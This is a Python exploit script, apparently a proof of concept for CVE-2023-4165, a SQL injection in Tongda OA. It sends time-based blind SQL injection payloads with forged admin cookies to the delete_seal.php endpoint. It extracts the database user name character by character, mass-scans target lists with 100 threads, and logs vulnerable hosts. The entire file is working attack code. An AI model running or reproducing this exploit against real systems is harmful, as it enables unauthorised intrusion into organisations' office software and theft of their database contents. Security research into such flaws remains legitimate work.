import requests
import argparse
import sys
import time
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """                                                            
___________                     ________          
\__    ___/___   ____    ____   \______ \ _____   
  |    | /  _ \ /    \  / ___\   |    |  \\__  \  
  |    |(  <_> )   |  \/ /_/  >  |    `   \/ __ \_
  |____| \____/|___|  /\___  /  /_______  (____  /
                    \//_____/           \/     \/ 
                             通达OA ≤ v11.10，v2017
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="通达OA SQL注入漏洞 CVE-2023-4165")
    parser.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="包含目标URL的文件路径")
    args = parser.parse_args()
    
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"用法:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        "Cookie": "PHPSESSID=hji419h9o5gc4dk3ftfqocmu42; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=baae495a"
    }
    payload1 = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR="
    characters = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()+-"
    result = ""
    
    try:
        for i in range(1, 31):
            found = False
            for c in characters:
                payload2 = f"1) and (substr(USER(),{i},1))=char({ord(c)}) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1)"
                start_time = time.time()
                res = requests.get(url=target + payload1 + payload2, headers=headers, verify=False, timeout=5)
                end_time = time.time()
                elapsed_time = end_time - start_time
                
                if elapsed_time >= 2:
                    result += c
                    print(result)
                    found = True
                    break  # 跳出字符循环
            if not found:
                break  # 跳出位置循环
        
        if result:
            print(f"[*] 目标 {target} 存在SQL注入漏洞")
            with open("result.txt", "a") as fp:
                fp.write(f"{target}, {result}\n")
        else:
            print(f"[-] 目标 {target} 未发现SQL注入漏洞")
    
    except requests.exceptions.RequestException as e:
        print(f"[!] 目标 {target} 请求异常:")
    
    except Exception as ex:
        print(f"[!] 目标 {target} 发生未知错误:")

if __name__ == "__main__":
    main()
